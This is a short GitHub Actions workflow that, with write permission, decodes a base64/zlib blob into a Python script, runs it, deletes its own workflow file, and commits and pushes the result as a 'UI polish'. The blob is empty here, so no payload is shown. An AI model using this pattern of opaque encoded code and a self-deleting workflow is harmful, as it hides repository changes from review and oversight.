name: EXP Polish Smart Routing UI

on:
  push:
    branches:
      - exp/rg-smart-routing-sol
    paths:
      - .github/workflows/exp-polish-smart-routing-ui.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10
        with:
          ref: exp/rg-smart-routing-sol
          fetch-depth: 0
      - name: Apply UI polish
        shell: bash
        run: |
          python3 -c "import base64,zlib;open('/tmp/patch.py','wb').write(zlib.decompress(base64.b64decode('')))"
          python3 /tmp/patch.py
          rm .github/workflows/exp-polish-smart-routing-ui.yml
          git config user.name 'RouteGate CI'
          git config user.email 'actions@users.noreply.github.com'
          git add -A
          git commit -m 'ui: polish smart routing admin UX'
          git push origin HEAD:exp/rg-smart-routing-sol
